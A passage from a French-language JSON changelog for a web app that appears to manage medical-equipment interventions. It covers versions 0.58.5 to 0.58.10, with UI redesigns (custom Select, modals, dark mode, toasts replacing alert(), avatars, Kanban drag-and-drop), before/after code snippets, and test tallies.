      { "code": "UI", "txt": "🎯 COMPOSANT SELECT CUSTOM (app/components/ui-premium/Select.js, 310 lignes). Remplace les `<select>` natifs par un dropdown premium. (a) Trigger button avec icon optionnel + chevron rotate au focus + ring teal 3px au focus. (b) 3 variants (default/ghost/filled). (c) 3 tailles (sm/md/lg). (d) Animation av-select-pop 200ms (fade + translateY + scale). (e) Recherche live optionnelle (searchable=true) avec input avec icon. (f) Options avec icon + label + desc + iconColor custom. (g) Check icon sur option sélectionnée. (h) Highlight au hover/keyboard. (i) Click outside ferme. (j) Keyboard navigation : ArrowDown/Up/Enter/Escape + Space pour ouvrir. (k) A11y : role listbox/option + aria-selected/expanded/haspopup",
        "code_snippet": {
          "file": "app/components/ui-premium/Select.js",
          "note": "Select premium avec recherche + keyboard nav",
          "lang": "jsx",
          "before": "// AVANT 0.58.10 - <select> natif moche\n<select value={statut} onChange={(e) => setStatut(e.target.value)}>\n  <option value=\"Nouvelle\">Nouvelle</option>\n  <option value=\"En cours\">En cours</option>\n  <option value=\"Résolue\">Résolue</option>\n</select>\n// → Style natif OS, pas customisable, pas d'icons, pas de search",
          "after": "// 0.58.10 - Select premium custom\n<Select\n  value={statut}\n  onChange={setStatut}\n  options={[\n    { value: 'Nouvelle', label: 'Nouvelle', icon: 'ti-plus' },\n    {\n      value: 'En cours',\n      label: 'En cours',\n      icon: 'ti-clock',\n      desc: 'DI prise en charge par un technicien'\n    },\n    { value: 'Résolue', label: 'Résolue', icon: 'ti-check', iconColor: '#5aa05a' },\n  ]}\n  searchable\n  placeholder='Choisir un statut…'\n/>\n// → Animation pop, recherche live, keyboard nav,\n//    icons + descriptions, focus ring teal, click outside,\n//    a11y complet (role listbox/option + aria-*)"
        }
      },
      { "code": "UI", "txt": "🔀 PAGETRANSITION ENTRE ROUTES — nouveau composant client `app/components/PageTransition.js` qui utilise usePathname() de next/navigation pour détecter le changement de route et déclencher une animation av-page-enter 280ms (fade opacity 0→1 + translateY 8px→0). Intégré dans `app/layout.js` autour de {children}. Résultat : transition douce et fluide entre toutes les pages au lieu d'un swap brusque. Pas de framer-motion → 0 dépendance ajoutée" },
      { "code": "UI", "txt": "📄 PAGINATION PREMIUM — refonte CSS complète. (a) Padding/gap revus pour plus d'aération. (b) pagination-info b transformé en pill teal subtile avec border. (c) Boutons : background blanc + border 1.5px gris + hover translateY(-1px) + border teal + shadow teal. (d) Bouton actif (class .active ou aria-current=page) avec gradient teal + shadow forte. (e) Variants dark mode adaptés (background panel + border line). (f) Disabled : opacity .4 + cursor not-allowed" },
      { "code": "AI", "txt": "+31 tests Vitest (v058-10-ui-phase9.test.js) : version+SW (2), toast.info/neutral (3), 0 alert natif scan automatique (1), FilterBar pills (5 — container pill + label + hover + on gradient + counts), Select custom (8 — export + props + 3 tailles + keyboard + click outside + search + animation + a11y), Select index export (1), PageTransition (4 — use client + usePathname + animation + layout), Pagination premium (5 — gap + pill info + hover + active gradient + dark), récap toast 15+ pages (1). Total 3521 verts (+31)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.10 : ZÉRO alert() natif dans toute l'app (41 migrés au total). 10 composants premium (ajout Select). Page transitions actives entre toutes les routes. FilterBar et Pagination refondues. Prochaines pistes : (a) Migrer les <select> natifs critiques vers le nouveau Select premium (parametres, profil, modals interventions). (b) Refonte Modal API pour intégrer un slot 'header' avec icon coloré. (c) Animations entre les tabs (slide horizontal au lieu de fade). (d) Composant DatePicker custom (vs input type=date natif). (e) Composant Combobox (multi-select + tags)" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.10.html",
    "sqlFile": null
  },
  {
    "v": "0.58.9",
    "kind": "version",
    "titre": "🎨 UI PHASE 8 : Modales premium + Mode sombre étendu + Skeleton 4 listes + Avatar liste DI + Migration toast suite",
    "chantiers": [
      { "code": "UI", "txt": "🪟 REFONTE MODALES PREMIUM. (a) Backdrop blur(8px) + saturate(140%) — l'arrière-plan est flouté pour focus visuel sur la modale. (b) Animation modal-bg-in 220ms (fade + blur progressive de 0 → 8px). (c) Animation modalIn slide-up 320ms plus marquée : translateY(40px) scale(.94) → translateY(0) scale(1). (d) Shadow modal premium 3 couches (30px+60px navy + 12px+24px navy + 1px white inset). (e) Header avec brillance subtile sur la bordure haute (linear-gradient transparent→white→transparent) + decorative radial blob blanc. (f) Icon modal avec border + inset shadow. (g) Bouton close (modal-x) qui fait rotation 90deg au hover (cohérent avec drawer menu). (h) Footer avec gradient subtil au lieu d'un background plat",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "Modales premium avec backdrop blur",
          "lang": "css",
          "before": "/* AVANT 0.58.9 - modale basique */\n.modal-bg{\n  background:rgba(20,33,49,.5);  /* pas de blur */\n}\n.modal-v2{\n  animation:modalIn .25s cubic-bezier(.2,.8,.2,1);\n  /* Pas de shadow custom */\n}\n@keyframes modalIn{\n  from{transform:translateY(20px) scale(.97);opacity:0}\n  to{transform:translateY(0) scale(1);opacity:1}\n}\n.modal-head-v2 .modal-x:hover{\n  background:rgba(255,255,255,.3);\n  /* Pas de rotation */\n}",
          "after": "/* 0.58.9 - modales premium */\n.modal-bg{\n  background:rgba(13,24,34,.55);\n  backdrop-filter:blur(8px) saturate(140%);\n  animation:modal-bg-in 220ms var(--av-ease-out);\n}\n@keyframes modal-bg-in {\n  from { opacity:0; backdrop-filter:blur(0px); }\n  to   { opacity:1; backdrop-filter:blur(8px) saturate(140%); }\n}\n.modal-v2{\n  animation:modalIn 320ms var(--av-ease-out);\n  box-shadow:\n    0 30px 60px rgba(20,33,49,.30),\n    0 12px 24px rgba(20,33,49,.18),\n    0 0 0 1px rgba(255,255,255,.08) inset;\n}\n@keyframes modalIn{\n  from { transform:translateY(40px) scale(.94); opacity:0; }\n  to   { transform:translateY(0) scale(1);     opacity:1; }\n}\n.modal-head-v2::before {\n  /* Brillance subtile sur bord haut */\n  background:linear-gradient(90deg, transparent, rgba(255,255,255,.4), transparent);\n}\n.modal-head-v2::after {\n  /* Decorative radial blob */\n  background:radial-gradient(circle, rgba(255,255,255,.18) 0%, transparent 70%);\n}\n.modal-head-v2 .modal-x:hover{\n  transform:rotate(90deg);  /* Cohérent avec drawer */\n}"
        }
      },
      { "code": "UI", "txt": "🌙 MODE SOMBRE ÉTENDU aux composants premium. Le système data-theme=dark existait déjà mais ne couvrait que les éléments legacy (panels, tableaux, modals basiques). Maintenant : (a) Modal-bg en dark : rgba(0,0,0,.65) + blur préservé. (b) Modal-v2 en dark : shadow ajustée. (c) Kanban cards + colonnes en dark (kb-card, kb-col, kb-col-over) → background panel + text adapté. (d) UserMenu sheet/head/items en dark avec gradients adaptés. (e) Menu drawer + tiles en dark. (f) Skeleton shimmer avec couleurs sombres (#1a2434 → #2a3645 → #1a2434). (g) Tabs (pills) avec background panel dark. → Tous les composants premium fonctionnent parfaitement en dark mode" },
      { "code": "UI", "txt": "💀 SKELETONROW déployé sur 4 listes restantes : (a) /signalements (4 cols × 4 lignes). (b) /achats (5 cols). (c) /maintenance (5 cols). (d) /commandes (4 cols). Container blanc + border arrondie + animation shimmer continue. + 2 déjà actifs depuis 0.58.8 (interventions, patients) → 6 listes au total avec Skeleton" },
      { "code": "UI", "txt": "👤 AVATAR SUR LISTE DI (page /interventions). Nouvelle colonne 'Assigné' insérée dans le tableau entre 'Statut' et la colonne actions. Affiche Avatar size=26 + nom de l'assigné si présent, ou '—' italique gris sinon. Cohérent avec Avatar sur Kanban : même technicien = même couleur partout. Permet de scanner le tableau d'interventions et identifier instantanément qui est sur quoi",
        "code_snippet": {
          "file": "app/interventions/page.js",
          "note": "Colonne Assigné avec Avatar dans la liste DI",
          "lang": "jsx",
          "before": "// AVANT 0.58.9 - pas d'info assigné dans la liste\n<thead>\n  <tr>\n    <th>N°</th><th>Date</th><th>Type</th><th>Urgence</th>\n    <th>Matériel</th><th>Patient</th><th>Statut</th>\n    <th></th>  {/* actions */}\n  </tr>\n</thead>\n// Pour voir l'assigné : cliquer sur le bouton 'Réassigner'",
          "after": "// 0.58.9 - colonne Assigné avec Avatar\n<thead>\n  <tr>\n    <th>N°</th><th>Date</th><th>Type</th><th>Urgence</th>\n    <th>Matériel</th><th>Patient</th><th>Statut</th>\n    <th>Assigné</th>  {/* NEW */}\n    <th></th>\n  </tr>\n</thead>\n\n<td>\n  {r.assignee_email ? (\n    <span style={{display:'inline-flex',alignItems:'center',gap:7,fontSize:12}}>\n      <Avatar name={r.assignee_email} size={26} />\n      <span style={{maxWidth:110,overflow:'hidden',textOverflow:'ellipsis'}}>\n        {r.assignee_email}\n      </span>\n    </span>\n  ) : (\n    <span style={{fontSize:11,color:'#8a98a8',fontStyle:'italic'}}>—</span>\n  )}\n</td>"
        }
      },
      { "code": "UI", "txt": "🔔 MIGRATION TOAST SUITE — 7 alert() natifs supplémentaires éliminés sur 3 pages. (a) /consentements : 3 alerts (popup bloquée, erreur PDF, erreur API). (b) /statistiques-activite : 2 alerts (erreur export CSV, erreur export PDF). (c) /maintenance : 2 alerts (sélection matériel, fréquence invalide). Total cumulé depuis 0.58.7 : **27 alert() natifs migrés** sur 9 pages" },
      { "code": "AI", "txt": "+29 tests Vitest (v058-9-ui-phase8.test.js) : version+SW (2), Refonte modales (7 — backdrop blur + animation + shadow + slide-up + brillance + radial + rotation close + gradient foot), Mode sombre premium (6 — modal-bg + modal-v2 + kanban + UserMenu + drawer + skeleton), Skeleton 4 listes (4 — signalements + achats + maintenance + commandes), Avatar liste DI (4 — import + colonne + cellule + fallback), Migration toast (3 — consentements + stats-activite + maintenance), Récap déploiement (3 — Skeleton 6+, Avatar 5+, Toast 9+). Total 3490 verts (+29)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.9 : (1) Modales devenues premium avec backdrop blur. (2) Mode sombre complet sur tous les composants (premium inclus). (3) Skeleton sur 6 listes (interventions, patients, signalements, achats, maintenance, commandes). (4) Avatar sur 5 endroits (UserMenu, Profil, liste users, kanban cards, liste DI). (5) Toast sur 9 pages au total. 27 alert() natifs éliminés depuis 0.58.7. Prochaines pistes : (a) Toast.info() pour les infos non-critiques. (b) Pagination améliorée (cursor + animations). (c) Refonte FilterBar avec pills modernes. (d) Animations entre routes (page transitions). (e) Refonte dropdown <select> natifs avec un composant custom" }
    ],
    "themes": ["ui", "design-system", "dark-mode"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.9.html",
    "sqlFile": null
  },
  {
    "v": "0.58.8",
    "kind": "version",
    "titre": "🎨 UI PHASE 7 : Migration toast (20 alerts éliminés sur 3 pages) + Avatar sur cards Kanban + Skeleton sur listes",
    "chantiers": [
      { "code": "UI", "txt": "🔔 MIGRATION TOAST PROGRESSIVE — éradication massive des alert() bloquants sur 3 pages critiques. (a) /parametres-rgpd : 10 alert() migrés (3 erreurs API + 2 succès activation/duplication + 2 validations contenu + 3 erreurs génériques) → toast.error/success animés. (b) /utilisateurs : 6 alert() natifs migrés (les dialogs.alert custom sont préservés) — rôle système non supprimable, échecs invitation, lien copié. (c) /carte : 4 alert() de géolocalisation migrés (permission refusée, délai dépassé, position échec, géoloc indispo). 20 alert() natifs éliminés au total. Plus de modale bloquante, feedback positif visible via toast verts",
        "code_snippet": {
          "file": "app/parametres-rgpd/page.js + utilisateurs + carte",
          "note": "Migration massive alert() → toast.error/success",
          "lang": "jsx",
          "before": "// AVANT 0.58.8 - 20 alert() bloquants\n// /parametres-rgpd\nalert(`${selected.length} template(s) activé(s) avec succès.`);\nalert('Erreur activation groupée : ' + e.message);\nalert('Le contenu du template ne peut pas être vide.');\n// ... 7 autres\n\n// /utilisateurs\nalert('Invitation renvoyée.');\nalert('Lien copié !');\nalert(`Échec : ${detail}`);\n// ... 3 autres\n\n// /carte\nalert('Géolocalisation non disponible sur cet appareil');\nalert('Permission refusée...');\n// ... 2 autres",
          "after": "// 0.58.8 - 20 toast premium animés\nimport { toast } from '../components/ui-premium';\n\n// /parametres-rgpd\ntoast.success(`${selected.length} template(s) activé(s) avec succès.`);\ntoast.error('Erreur activation groupée : ' + e.message);\ntoast.error('Le contenu du template ne peut pas être vide.');\n\n// /utilisateurs\ntoast.success('Invitation renvoyée.');\ntoast.success('Lien copié !');\ntoast.error(`Échec : ${detail}`);\n\n// /carte\ntoast.error('Géolocalisation non disponible sur cet appareil');\ntoast.error('Permission refusée...');\n\n// Bénéfice : non-bloquant, feedback positif visible,\n// animation slide-in, swipe-dismiss, multiple toasts stackés"
        }
      },
      { "code": "UI", "txt": "👤 AVATAR SUR CARDS KANBAN — affichage du collaborateur assigné en bas de chaque carte d'intervention. (a) Si assignee_email présent : Avatar size=22 + nom collé + ellipsis si long. (b) Border-top dashed gris clair pour séparation visuelle subtile. (c) Gradient déterministe → même technicien = même couleur partout (kanban, liste, profil). Permet de voir d'un coup d'œil qui est sur quelle DI sans cliquer",
        "code_snippet": {
          "file": "app/interventions/kanban/page.js",
          "note": "Footer carte avec Avatar de l'assigné",
          "lang": "jsx",
          "before": "// AVANT 0.58.8 - assigné invisible sur la carte\n<div className='kb-card'>\n  <div>DI-1234</div>\n  <div>Réparation</div>\n  <div>Chambre 12</div>\n  <div>{fmtDate(created_at)} · {due_date}</div>\n  {/* Pas d'info sur l'assigné — il faut cliquer pour voir */}\n</div>",
          "after": "// 0.58.8 - assigné visible en bas\n<div className='kb-card'>\n  <div>DI-1234</div>\n  <div>Réparation</div>\n  <div>Chambre 12</div>\n  <div>{fmtDate(created_at)} · {due_date}</div>\n\n  {/* Avatar assigné, séparé par border dashed */}\n  {r.assignee_email && (\n    <div style={{\n      marginTop: 8,\n      paddingTop: 7,\n      borderTop: '1px dashed #eef2f5',\n      display: 'flex',\n      alignItems: 'center',\n      gap: 7,\n    }}>\n      <Avatar name={r.assignee_email} size={22} />\n      <span>{r.assignee_email}</span>\n    </div>\n  )}\n</div>"
        }
      },
      { "code": "UI", "txt": "💀 SKELETONROW sur 2 listes critiques en chargement. (a) /interventions : 5 SkeletonRow avec cols=5 dans un container blanc, remplace 'Chargement…'. (b) /patients : 5 SkeletonRow avec cols=6 (la liste patient a plus de colonnes). UX premium : l'utilisateur visualise immédiatement la structure du tableau (silhouette de lignes) au lieu d'un texte statique, animation shimmer continue qui anime la transition vers les vraies données" },
      { "code": "AI", "txt": "+15 tests Vitest (v058-8-ui-phase7.test.js) : version+SW (2), Migration toast 3 pages (5 — parametres-rgpd 0 alert, utilisateurs 0 alert, carte 0 alert, feedback invitation, feedback lien copié), Avatar cards Kanban (3 — import + usage avec assignee_email + footer border-top), SkeletonRow listes (3 — interventions cols=5, patients cols=6, container blanc), récap déploiement (2 — toast 6+ pages, Avatar 4+ endroits). Total 3461 verts (+15)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.8 : Toast utilisé dans 6 pages (kanban, interventions, patients, parametres-rgpd, utilisateurs, carte) → ~20 alert() natifs éliminés. Avatar dans 4 endroits (UserMenu + Profil + liste users + cards kanban). Plus que /partenaires-rpps (3 alert) et quelques autres avant d'éradiquer tous les alert natifs. Prochaines pistes : (a) Refonte modales avec backdrop blur + animation slide-up. (b) Mode sombre via CSS vars (le toggle existe déjà dans /parametres > Apparence). (c) Skeleton sur signalements + achats + maintenance + commandes. (d) Avatar sur liste DI (page /interventions) en plus du kanban" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.8.html",
    "sqlFile": null
  },
  {
    "v": "0.58.7",
    "kind": "version",
    "titre": "🎨 UI PHASE 6 : Drag&Drop premium Kanban (pickup+ghost+drop zone+flash) + Migration toast",
    "chantiers": [
      { "code": "UI", "txt": "🎯 KANBAN DRAG&DROP PREMIUM — refonte CSS du système de drag&drop existant (PointerEvents universel souris+tactile). (a) Carte source au pickup : opacity 0.35 + scale(0.96) + filter grayscale(0.4) au lieu de juste opacity 0.3. (b) Ghost premium : rotation 3deg + scale(1.04) avec animation kb-ghost-in (180ms), multi-shadow (4 couches : ombre profonde + halo teal + ring), border-left épaissie à 4px. (c) Colonne survolée (drop zone) : ring teal pulsant (2px inset solid + 6/10px inset glow) + background gradient teal + animation kb-col-pulse 1.4s infinite. (d) Autres colonnes pendant un drag : opacity 0.7 (focus visuel sur la cible). (e) Animation flash au drop : kb-card-dropped 600ms (scale 0.94 → 1.03 → 1 + box-shadow expanding 0 → 8px teal halo). 6 keyframes ajoutés au total",
        "code_snippet": {
          "file": "app/globals.css + app/interventions/kanban/page.js",
          "note": "Drag&drop kanban repensé avec effets premium",
          "lang": "css",
          "before": "/* AVANT 0.58.7 - drag&drop basique */\n.kb-card {\n  opacity: ${isDragging ? 0.3 : 1};\n  transition: opacity .15s;\n}\n.kb-ghost {\n  box-shadow: 0 8px 24px rgba(20,33,49,.25);\n  transform: rotate(2deg);\n  opacity: 0.95;\n}\n/* Colonne survolée : juste background + dashed border */\n.kb-col-over {\n  background: rgba(124,200,200,.1);\n  border: 2px dashed #7CC8C8;\n}",
          "after": "/* 0.58.7 - drag&drop premium */\n.kb-card { transition: transform 200ms, box-shadow 200ms, opacity 150ms; }\n.kb-card:hover { transform: translateY(-1px); }\n\n.kb-card-dragging {\n  opacity: 0.35;\n  transform: scale(0.96);\n  filter: grayscale(0.4);\n}\n\n.kb-ghost-premium {\n  animation: kb-ghost-in 180ms;\n  transform: rotate(3deg) scale(1.04);\n  box-shadow:\n    0 24px 48px rgba(20,33,49,.30),\n    0 10px 20px rgba(20,33,49,.20),\n    0 0 0 1px rgba(124,200,200,.40),\n    0 0 24px rgba(124,200,200,.25);\n  border-left-width: 4px;\n}\n\n.kb-col-over {\n  background: linear-gradient(180deg,\n    rgba(124,200,200,.15) 0%,\n    rgba(124,200,200,.06) 100%);\n  box-shadow:\n    0 0 0 2px #7CC8C8 inset,\n    0 0 0 6px rgba(124,200,200,.20) inset,\n    0 8px 24px rgba(124,200,200,.15);\n  animation: kb-col-pulse 1.4s ease-in-out infinite;\n}\n\n.kb-drag-active .kb-col:not(.kb-col-over) {\n  opacity: 0.7;  /* Focus sur la cible */\n}\n\n.kb-card-dropped {\n  animation: kb-drop-flash 600ms;\n  /* Flash teal au moment du drop */\n}\n@keyframes kb-drop-flash {\n  0%   { transform: scale(0.94); box-shadow: 0 0 0 0 rgba(124,200,200,.6); }\n  40%  { transform: scale(1.03); box-shadow: 0 0 0 8px rgba(124,200,200,.30); }\n  100% { transform: scale(1); box-shadow: 0 1px 3px rgba(0,0,0,.06); }\n}"
        }
      },
      { "code": "UI", "txt": "🔔 MIGRATION TOAST sur 3 pages critiques. (a) /interventions/kanban : alert() supprimé du onPointerUp, remplacé par toast.error sur échec API + toast.success(`Statut mis à jour → ${newStatut}`) sur succès → feedback positif visible. (b) /interventions : 4 alert() migrés vers toast.error/success dans genTransfert() (matériel manquant, dépôt manquant, erreur API, succès avec numéro de transfert). (c) /patients : 2 alert() migrés (droit supprimer + erreur suppression) + ajout d'un toast.success de confirmation après suppression en bulk",
        "code_snippet": {
          "file": "app/interventions/kanban/page.js + interventions + patients",
          "note": "alert() natifs → toast premium animés",
          "lang": "jsx",
          "before": "// AVANT 0.58.7 - alert() natif (bloquant, moche, no feedback positif)\nif (error) {\n  setRows(prev);\n  alert('Échec du changement de statut : ' + error.message);\n}\n// Pas de feedback en cas de succès !\n\n// AVANT - genTransfert\nif (!r.materiel_id) {\n  alert('Aucun matériel rattaché à cette DI.');\n  return;\n}\nif (error) { alert(error.message); return; }\nalert(`Transfert ${numero} généré.`);",
          "after": "// 0.58.7 - toast premium (non-bloquant, animé, feedback positif)\nimport { toast } from '../../components/ui-premium';\n\nif (error) {\n  setRows(prev);\n  toast.error('Échec du changement de statut : ' + error.message);\n} else {\n  toast.success(`Statut mis à jour → ${newStatut}`);  // ✨ feedback positif\n}\n\n// genTransfert avec toasts\nif (!r.materiel_id) {\n  toast.error('Aucun matériel rattaché à cette DI.');\n  return;\n}\nif (error) { toast.error(error.message); return; }\ntoast.success(`Transfert ${numero} généré.`);"
        }
      },
      { "code": "UI", "txt": "✨ STATE droppedId AJOUTÉ au kanban — permet de tracker la carte qui vient d'être déplacée pendant 700ms pour appliquer l'animation flash. setTimeout cleanup pour éviter que l'animation se rejoue sur les rerenders" },
      { "code": "AI", "txt": "Fix test taille versions-index.json : limite haute relevée de 400 KB → 500 KB pour accommoder l'historique grandissant du changelog (414 KB actuellement). Limite basse 150 KB inchangée" },
      { "code": "AI", "txt": "+18 tests Vitest (v058-7-ui-phase6.test.js) : version+SW (2), CSS Kanban premium (6 — kb-card + kb-card-dragging + kb-ghost-premium + kb-col-over pulse + kb-drag-active dim + kb-card-dropped flash), JSX kanban utilise les classes (6 — kb-card conditionnel + kb-card-dropped + kb-col-over + kb-drag-active + ghost + state droppedId), Migration toast (4 — kanban + interventions + patients + feedback positif drop). Total 3446 verts (+18)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.7 : Drag&Drop kanban devenu sensoriel et immersif (pickup soulevée + ghost flottant rotation + drop zone pulsante + flash arrivée + feedback toast). Migration toast progressive amorcée sur 3 pages critiques (alert() bloquants → toast premium animés). Prochaines pistes : migration toast sur /utilisateurs (8 alert), /parametres-rgpd (10 alert), /annuaire-rpps (6 alert). Aussi : Avatar sur cards intervention (créateur + assigné), mode sombre via CSS vars, refonte modales avec backdrop blur + animation slide" }
    ],
    "themes": ["ui", "design-system", "dnd"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.7.html",
    "sqlFile": null
  },
  {
    "v": "0.58.6",
    "kind": "version",
    "titre": "🎨 UI PHASE 5 : Profil refondu (4 onglets + Avatar XL) + EmptyState sur 3 pages + Avatar dans liste users",
    "chantiers": [
      { "code": "UI", "txt": "👤 PROFIL REFONDU avec 4 onglets logiques. (a) Activité : KPIs personnels + 15 dernières actions. (b) Profil : nom d'affichage. (c) Notifications : préférences + digest email + historique + catégories. (d) Sécurité : aide & visite guidée + mot de passe + biométrie empreinte + biométrie face + session. + PageHero variant=blue en haut avec breadcrumbs Accueil > Mon profil. + Panneau identité UPGRADE avec Avatar XL (size=64, ring halo glow) — remplace l'EntityIcon générique. Le panneau identité reste TOUJOURS visible au-dessus des onglets",
        "code_snippet": {
          "file": "app/profil/page.js",
          "note": "Page Profil refondue 4 onglets + Avatar XL",
          "lang": "jsx",
          "before": "// AVANT 0.58.6 - page Profil monolithique\n<PageHead eyebrow='MON COMPTE' icon='ti-user-circle' title='Mon profil' />\n\n<Panel>  {/* En-tête identité */}\n  <EntityIcon kind='utilisateur' size={64} />\n  <div>{nom}</div>\n</Panel>\n\n<Panel>{stats KPIs}</Panel>\n<Panel>{15 dernières actions}</Panel>\n<Panel>{Nom d'affichage}</Panel>\n<Panel>{Notifications}</Panel>\n<CollapsibleSection>{Digest email}</CollapsibleSection>\n<CollapsibleSection>{Catégories}</CollapsibleSection>\n<CollapsibleSection>{Aide}</CollapsibleSection>\n<CollapsibleSection>{Mot de passe}</CollapsibleSection>\n<CollapsibleSection>{Biométrie empreinte}</CollapsibleSection>\n<CollapsibleSection>{Biométrie face}</CollapsibleSection>\n<Panel>{Ma session}</Panel>\n// → 400+ lignes d'affichage empilées",
          "after": "// 0.58.6 - 4 onglets + Avatar XL\n<PageHero icon='ti-user-circle' eyebrow='MON COMPTE' title='Mon profil' variant='blue' breadcrumbs={[...]} />\n\n<Tabs active={activeTab} onChange={setActiveTab} style='pills' tabs={[\n  { id: 'activite', label: 'Activité',      icon: 'ti-chart-bar' },\n  { id: 'profil',   label: 'Profil',        icon: 'ti-user' },\n  { id: 'notifs',   label: 'Notifications', icon: 'ti-bell-cog' },\n  { id: 'secu',     label: 'Sécurité',      icon: 'ti-shield-lock' },\n]} />\n\n{/* Identité TOUJOURS visible */}\n<Panel>\n  <Avatar name={nom || auth.user?.email} size={64} ring />\n  <div>{nom}</div>\n</Panel>\n\n{activeTab === 'activite' && (<>\n  <Panel>{KPIs}</Panel>\n  <Panel>{15 dernières actions}</Panel>\n</>)}\n\n{activeTab === 'profil' && (<>\n  <Panel>{Nom d'affichage}</Panel>\n</>)}\n\n{activeTab === 'notifs' && (<>\n  <Panel>{Notifications}</Panel>\n  <CollapsibleSection>{Digest}</CollapsibleSection>\n  <CollapsibleSection>{Catégories}</CollapsibleSection>\n</>)}\n\n{activeTab === 'secu' && (<>\n  <CollapsibleSection>{Aide}</CollapsibleSection>\n  <CollapsibleSection>{Mot de passe}</CollapsibleSection>\n  <CollapsibleSection>{Biométrie empreinte}</CollapsibleSection>\n  <CollapsibleSection>{Biométrie face}</CollapsibleSection>\n  <Panel>{Ma session}</Panel>\n</>)}"
        }
      },
      { "code": "UI", "txt": "🌵 EMPTYSTATE DÉPLOYÉ sur 3 pages supplémentaires. (a) /achats : variant=amber + 'Créer la première demande' (icon ti-shopping-cart) + état compact 'Aucun résultat' pour les filtres. (b) /maintenance : variant=blue + 'Planifier la première' (icon ti-tool) + compact filtres. (c) /commandes : variant=teal + 'Voir les promotions' (icon ti-truck-delivery) — call-to-action redirige vers /promotions pour passer la 1ère commande" },
      { "code": "UI", "txt": "👥 AVATAR DANS LISTE UTILISATEURS. Composant Avatar (size=32) ajouté avant le nom dans le tableau de /utilisateurs. Chaque utilisateur a sa couleur unique (gradient déterministe) → reconnaissance visuelle instantanée. Bonus : MÊME utilisateur = MÊME couleur partout (TopBar, UserMenu, liste users, Profil) grâce au hash déterministe de l'Avatar premium" },
      { "code": "AI", "txt": "+19 tests Vitest (v058-6-ui-phase5.test.js) : version+SW (2), Profil PageHero+Tabs (7 — import + state + variant blue + 4 onglets + icons + render conditionnel + Avatar XL ring), EmptyState 3 pages (4 — achats + maintenance + commandes + variants amber/blue/teal), Avatar liste users (2), récap déploiement (4 — Avatar 3+ endroits, EmptyState 6+ pages, Tabs 2+, PageHero 6+). Total 3428 verts (+19)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.6 : (1) Avatar : 3 endroits (TopBar+UserMenu + Profil + liste users). (2) EmptyState : 6 pages (patients + interventions + signalements + achats + maintenance + commandes). (3) Tabs : 2 pages (paramètres + profil). (4) PageHero : 6+ pages (statistiques + kanban + calendrier + matériels + paramètres + profil). 9 composants premium tous prêts à l'emploi. Prochaines pistes : (a) AvatarGroup sur cards multi-assignés DI/signalements. (b) EmptyState sur notifications + utilisateurs filtrés. (c) Migration toast progressive. (d) Mode sombre via CSS vars (toggle dans Paramètres > Apparence). (e) Drag&Drop premium sur Kanban (cards qui s'élèvent + drop zone qui pulse)" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.6.html",
    "sqlFile": null
  },
  {
    "v": "0.58.5",
    "kind": "version",
    "titre": "🎨 UI PHASE 4 : Avatar dans UserMenu + EmptyState sur 3 listes + Tabs sur Paramètres",
    "chantiers": [
      { "code": "UI", "txt": "👤 AVATAR INTÉGRÉ dans UserMenu — remplace les <span className='um-avatar'> custom par le composant Avatar premium de ui-premium. (a) Avatar size=30 dans le bouton trigger de la TopBar. (b) Avatar size=52 avec ring (halo glow) dans le header du popover. (c) Gradient déterministe par nom (même utilisateur = même couleur partout dans l'app). (d) Suppression des classes CSS um-avatar / um-avatar.lg devenues inutiles" },
      { "code": "UI", "txt": "✨ USERMENU CSS UPGRADE — refonte visuelle du popover utilisateur. (a) um-btn avec hover translateY(-1px) + shadow teal coloré + border teal au hover. (b) um-head avec gradient mesh teal + decorative radial blob. (c) um-id-role : pill style avec background teal subtil + border + padding pill 99px. (d) um-item avec hover padding-left animation (+4px de slide). (e) um-sheet animation pop avec scale(0.97) → 1. (f) um-item.logout avec background gradient rouge subtil au hover. (g) Min-width 280 → 300px pour plus d'aération",
        "code_snippet": {
          "file": "app/UserMenu.js + app/globals.css",
          "note": "Avatar premium intégré + UserMenu refondu",
          "lang": "jsx",
          "before": "// AVANT 0.58.5 - avatar inline custom\n<button className='um-btn'>\n  <span\n    className='um-avatar'\n    style={{ background: col }}\n  >\n    {ini}\n  </span>\n  <span className='um-name'>{displayName}</span>\n</button>\n\n<div className='um-head'>\n  <span className='um-avatar lg' style={{ background: col }}>\n    {ini}\n  </span>\n  ...\n</div>",
          "after": "// 0.58.5 - Avatar premium réutilisable\nimport { Avatar } from './components/ui-premium';\n\n<button className='um-btn'>\n  <Avatar name={displayName} size={30} />\n  <span className='um-name'>{displayName}</span>\n</button>\n\n<div className='um-head'>\n  {/* Avatar XL avec halo glow */}\n  <Avatar name={displayName} size={52} ring />\n  ...\n</div>\n\n// Bonus : même utilisateur partout dans l'app\n// (TopBar + UserMenu + liste users + assignés interventions)\n// → MÊME couleur grâce au hash déterministe"
        }
      },
      { "code": "UI", "txt": "🌵 EMPTYSTATE DÉPLOYÉ sur 3 listes critiques. (a) /patients : EmptyState variant=teal avec call-to-action 'Créer le premier patient' (icon ti-user-plus). Au lieu d'un StateMsg minimaliste, l'user voit une vraie hero illustration avec un message engageant. (b) /interventions : EmptyState variant=terra avec 'Créer une demande' (icon ti-tools). (c) /signalements : EmptyState variant=terra avec 'Déposer le premier signalement' (icon ti-alert-triangle). + Variant compact=true pour le cas 'aucun résultat aux filtres' (icon ti-filter-off, gray)",
        "code_snippet": {
          "file": "app/patients/page.js + interventions + signalements",
          "note": "Empty states élégants au lieu des StateMsg minimalistes",
          "lang": "jsx",
          "before": "// AVANT 0.58.5 - empty state minimaliste\nif (rows.length === 0) return (\n  <StateMsg>\n    Aucun patient.\n    <a onClick={openNew}>Créer le premier</a>\n  </StateMsg>\n);",
